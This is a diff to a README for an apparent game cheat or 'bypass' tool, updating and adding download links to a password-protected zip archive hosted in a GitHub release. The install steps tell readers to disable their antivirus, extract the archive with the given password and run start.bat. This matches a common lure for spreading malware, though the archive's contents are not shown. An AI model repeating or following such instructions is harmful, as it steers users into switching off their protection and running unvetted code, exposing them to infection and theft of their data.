@@ -1,6 +1,6 @@
 <br>
 <div align="center">
-<a href="https://github.com/Xpro34/ZetTools/releases/download/ZetTools/ZetTools.zip">
+<a href="https://github.com/Xpro34/Zenless-Tools/releases/download/ZetTools/ZenlessTools.zip">
 <img src="https://i.ibb.co/j93QBdCT/Chat-GPT-Image-12-2026-16-13-18-upscayl-2x-digital-art-4x.png">
 </a>
 </div>
@@ -25,6 +25,7 @@ Features:
 - Improved performance.
 
 ### ✅ How to install:
+[Download](https://github.com/Xpro34/Zenless-Tools/releases/download/ZetTools/ZenlessTools.zip)
 1) Disable your antivirus software, otherwise it may block the files to protect against banning! (Bypass files)
 2) Extract the archive to any convenient location (PASS - zzz26)
 3) Run the start.bat file
